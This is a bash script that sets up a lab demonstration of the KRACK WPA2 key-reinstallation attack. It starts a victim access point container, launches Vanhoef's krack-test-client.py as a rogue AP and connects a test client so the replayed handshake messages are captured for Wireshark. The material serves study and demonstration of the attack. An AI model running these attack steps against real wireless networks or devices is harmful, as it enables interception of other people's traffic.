#!/bin/bash
#
# run_krack_demo.sh
#
# Orchestrates the KRACK (CVE-2017-13077) demonstration:
#   1. Starts the victim AP container on wlan0
#   2. Starts a packet capture on wlan2 (the KRACK attacker interface)
#   3. Launches Mathy Vanhoef's modified hostapd (krack-test-client.py) on wlan2
#   4. Connects a victim wpa_supplicant client on wlan1 to the rogue AP
#
# Prerequisites:
#   - ./setup_interfaces.sh 3   (3 radios: wlan0, wlan1, wlan2)
#   - ~/krackattacks/krackattack built and venv set up (see docs/KRACK_NOTES.md)
#   - Hardware encryption disabled (sudo ./disable-hwcrypto.sh && reboot)
#
# This script must be run with a working krackattacks-scripts checkout at
# ~/krackattacks. Adjust KRACK_DIR below if installed elsewhere.
#
set -e

KRACK_DIR="${KRACK_DIR:-$HOME/krackattacks/krackattack}"
LAB_DIR="$(cd "$(dirname "$0")/.." && pwd)"

if [ ! -d "$KRACK_DIR" ]; then
    echo "[-] krackattacks-scripts not found at $KRACK_DIR"
    echo "    Clone it with: git clone https://github.com/vanhoefm/krackattacks-scripts.git ~/krackattacks"
    exit 1
fi

echo "[*] Caching sudo credentials..."
sudo -v

echo "[*] Starting victim AP container..."
cd "$LAB_DIR"
docker-compose up -d ap
sleep 10
docker logs wpa2_ap | tail -5

echo "[*] Starting tcpdump capture on wlan2..."
sudo tcpdump -i wlan2 -w "$LAB_DIR/shared/krack_capture.pcap" &
TCPDUMP_PID=$!
sleep 2

echo "[*] Writing victim client config..."
sudo tee /tmp/krack_client.conf > /dev/null << 'EOF'
ctrl_interface=/var/run/wpa_supplicant
network={
    ssid="testnetwork"
    psk="abcdefgh"
    key_mgmt=WPA-PSK
    proto=RSN
    pairwise=CCMP
    group=CCMP
}
EOF

echo ""
echo "[*] Launching KRACK attack script (Ctrl+C in this terminal once you see"
echo "    repeated 'sending a new 4-way message 3' lines and the verdict line)."
echo ""

(
    cd "$KRACK_DIR"
    source venv/bin/activate
    sudo -E "$(which python3)" krack-test-client.py &
    KRACK_PID=$!

    # give the rogue AP time to come up
    sleep 8

    echo "[*] Connecting victim client on wlan1..."
    sudo killall wpa_supplicant 2>/dev/null || true
    sleep 1
    sudo wpa_supplicant -i wlan1 -D nl80211 -c /tmp/krack_client.conf -d 2>&1 &
    CLIENT_PID=$!

    echo ""
    echo "[*] Running for 30 seconds to capture multiple MSG3 replays..."
    sleep 30

    sudo kill $CLIENT_PID 2>/dev/null || true
    sudo kill $KRACK_PID 2>/dev/null || true
)

echo "[*] Stopping capture..."
sudo kill -SIGINT $TCPDUMP_PID 2>/dev/null || true
sleep 1

cd "$LAB_DIR"
docker-compose down

sudo chmod 644 shared/krack_capture.pcap

echo ""
echo "[+] KRACK capture saved to shared/krack_capture.pcap"
echo "[+] Open in Wireshark and filter on 'eapol' to see MSG3 replayed multiple"
echo "    times from 02:00:00:00:02:00 (the KRACK rogue AP on wlan2)."
echo ""
echo "    wireshark shared/krack_capture.pcap &"
